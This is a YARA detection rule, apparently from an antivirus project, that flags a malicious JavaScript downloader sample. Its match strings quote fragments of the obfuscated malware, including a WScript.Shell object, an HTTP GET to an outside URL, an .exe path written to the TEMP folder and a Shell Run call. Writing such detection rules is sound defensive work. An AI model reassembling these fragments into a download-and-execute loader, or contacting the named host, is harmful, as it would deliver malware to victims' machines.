rule sig_20160328_305fa67df319b6ba696deccd4134c7ba {
  meta:
    description = "datamaliciousorder - file 20160328_305fa67df319b6ba696deccd4134c7ba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fa2b579fa02d799715b34820d143ebc90369a3a0e30e592240c26532420cd338"

  strings:
    $s1  = "function Aviyqddn() {return Scwyrxvf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"l3fzFtmo39QxuiQ.exe\";};" fullword ascii
    $s2  = "do {WScript[Fksfdeyd](Znfbdnyn() * 11)} while (Qvmpdi[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Xfpgrmojo(Iwuklzeu, Whniroztdt){return Iwuklzeu - Whniroztdt;};" fullword ascii
    $s4  = "Qvmpdi[Fkmfzzq](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s5  = "var Scwyrxvf = function Khctfwsli() {return WScript[Ixcosn](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Gcxfscpph(Zlooxlvru){Scwyrxvf[\"Run\"](Zlooxlvru, Ofhnfo, Ofhnfo);};" fullword ascii
    $s7  = "function Xftripdm() {return ((Aehqfbk == true) && (Aehqfbk == Ehcocdrk)) ? 1 : Ofhnfo;};" fullword ascii
    $s8  = "function Ibibwgazq(){return Ixcosn;};" fullword ascii
    $s9  = "function Znfbdnyn(){return 22;};" fullword ascii
    $s10 = "var Kbsxmgpbz = new this[\"Date\"]();" fullword ascii
    $s11 = "var Dfdtg = false;" fullword ascii
    $s12 = "Aehqfbk = true; " fullword ascii
    $s13 = "Ehcocdrk = true; " fullword ascii
    $s14 = "var Ehcocdrk = false;" fullword ascii
    $s15 = "var Aehqfbk = false;" fullword ascii
    $s16 = "return Xfpgrmojo(Stbvdfinip, Zdmoiol);" fullword ascii
    $s17 = "function Whqqz(){return Oqxnb;};" fullword ascii
    $s18 = " while (Cupqodpgm){" fullword ascii
    $s19 = "function Hvszpc(Auiahh) {var Wthbmmx = (1, 2, 3, 4, 5, Auiahh); return Wthbmmx;};" fullword ascii
    $s20 = "function Nqurng()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}